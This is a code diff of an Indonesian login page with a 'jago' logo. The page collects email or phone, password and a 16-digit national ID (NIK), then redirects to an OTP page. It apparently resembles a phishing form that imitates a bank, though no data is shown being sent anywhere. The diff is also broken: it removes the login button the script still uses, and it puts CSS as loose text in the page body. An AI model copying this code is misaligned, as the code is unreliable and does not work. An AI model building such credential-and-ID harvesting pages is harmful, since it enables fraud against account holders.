@@ -136,25 +136,41 @@
       <img src="logo-jago.jpg" alt="Logo" class="logo" onerror="this.style.display='none'">
       <h2>Masuk ke Akun</h2>
 
-      <div class="field">
-        <input type="text" id="email" placeholder="Email / No HP">
-      </div>
+     <div class="field">
+  <input type="text" id="email" placeholder="Email / No HP">
+  <small class="error" id="errEmail"></small>
+</div>
 
-      <div class="field password-box">
-        <input type="password" id="password" placeholder="Password">
-        <span class="eye" id="eye" onclick="togglePass()">👁️</span>
-      </div>
+<div class="field password-box">
+  <input type="password" id="password" placeholder="Password">
+  <span class="eye" onclick="togglePass()" id="eye">👁️</span>
+  <small class="error" id="errPass"></small>
+</div>
 
-      <div class="field">
-        <input type="text" id="nik" placeholder="NIK KTP (16 digit)" inputmode="numeric" maxlength="16">
-        <small class="hint">Pastikan NIK sesuai KTP</small>
-      </div>
-
-      <button id="btnLogin">Masuk</button>
-      <div class="loading" id="loading">Memproses...</div>
-    </div>
+<div class="field">
+  <input type="text" id="nik" placeholder="NIK KTP (16 digit)">
+  <small class="error" id="errNik"></small>
+</div>
   </div>
+.error {
+  display: block;
+  text-align: left;
+  font-size: 12px;
+  color: red;
+  margin-top: 4px;
+}
 
+.shake {
+  animation: shake 0.3s;
+}
+
+@keyframes shake {
+  0% { transform: translateX(0); }
+  25% { transform: translateX(-5px); }
+  50% { transform: translateX(5px); }
+  75% { transform: translateX(-5px); }
+  100% { transform: translateX(0); }
+}
   <script>
     function togglePass() {
       const input = document.getElementById("password");
@@ -182,39 +198,66 @@
       return regex.test(value);
     }
 
-    document.getElementById("btnLogin").addEventListener("click", function () {
-      const email = document.getElementById("email").value.trim();
-      const pass = document.getElementById("password").value;
-      const nik = document.getElementById("nik").value.trim();
-      const loading = document.getElementById("loading");
-      const btn = this;
+    document.getElementById("btnLogin").addEventListener("click", function() {
 
-      if (!isValidEmailOrPhone(email)) {
-        alert("Masukkan Email / No HP yang valid");
-        return;
-      }
+  let email = document.getElementById("email");
+  let pass = document.getElementById("password");
+  let nik = document.getElementById("nik");
 
-      if (!isStrongPassword(pass)) {
-        alert("Password harus kuat!\nContoh: King&2828");
-        return;
-      }
+  let errEmail = document.getElementById("errEmail");
+  let errPass = document.getElementById("errPass");
+  let errNik = document.getElementById("errNik");
 
-      if (!/^[0-9]{16}$/.test(nik)) {
-        alert("NIK harus 16 digit angka!");
-        return;
-      }
+  // reset error
+  errEmail.innerText = "";
+  errPass.innerText = "";
+  errNik.innerText = "";
 
-      localStorage.setItem("userLogin", email);
-      localStorage.setItem("nik", nik);
+  let valid = true;
 
-      btn.disabled = true;
-      btn.innerText = "Memproses...";
-      loading.style.display = "block";
+  // EMAIL
+  if(email.value.length < 5){
+    errEmail.innerText = "Email / No HP tidak valid";
+    email.classList.add("shake");
+    valid = false;
+  }
 
-      setTimeout(function () {
-        window.location.href = "otp.html";
-      }, 1200);
-    });
+  // PASSWORD (simple biar gak ribet)
+  if(pass.value.length < 6){
+    errPass.innerText = "Password minimal 6 karakter";
+    pass.classList.add("shake");
+    valid = false;
+  }
+
+  // NIK
+  if(!/^[0-9]{16}$/.test(nik.value)){
+    errNik.innerText = "NIK harus 16 digit angka";
+    nik.classList.add("shake");
+    valid = false;
+  }
+
+  // hapus animasi setelah jalan
+  setTimeout(() => {
+    email.classList.remove("shake");
+    pass.classList.remove("shake");
+    nik.classList.remove("shake");
+  }, 300);
+
+  if(!valid) return;
+
+  // SIMPAN DATA
+  localStorage.setItem("userLogin", email.value);
+  localStorage.setItem("nik", nik.value);
+
+  let btn = this;
+  btn.innerText = "Memproses...";
+  btn.style.opacity = "0.7";
+
+  setTimeout(function(){
+    window.location.href = "otp.html";
+  }, 1200);
+
+});
   </script>
 </body>
 </html>
